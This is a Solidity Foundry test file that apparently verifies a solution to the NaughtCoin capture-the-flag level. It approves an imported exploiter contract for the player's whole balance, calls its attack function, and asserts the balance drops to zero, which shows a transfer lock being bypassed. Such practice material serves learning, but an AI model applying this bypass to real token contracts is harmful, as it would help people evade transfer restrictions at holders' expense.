// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";
import {NaughtCoinExploiter} from "../src/NaughtCoinExploiter.sol";

contract NaughtCoinExploiterTest is Test {
    NaughtCoin public coin;
    NaughtCoinExploiter public exploiter;
    address public player = address(1);

    function setUp() public {
        coin = new NaughtCoin(player);
        exploiter = new NaughtCoinExploiter(player, coin);
    }

    function test_Attack() public {
        vm.startPrank(player);
        coin.approve(address(exploiter), coin.balanceOf(player));
        exploiter.attack();
        vm.stopPrank();

        assertEq(coin.balanceOf(player), 0);
    }
}
